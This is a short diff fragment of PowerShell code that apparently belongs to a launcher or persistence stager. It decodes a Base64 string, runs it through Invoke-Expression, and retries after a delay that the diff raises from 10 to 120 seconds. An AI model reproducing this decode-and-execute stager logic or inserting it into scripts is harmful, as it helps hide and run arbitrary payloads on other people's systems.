@@ -50,7 +50,7 @@ $primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64
 $primer } 
 $primer = primer
 if ($primer) {$primer| iex} else {
-start-sleep 10
+start-sleep 120
 primer | iex }'
 return $command
 }
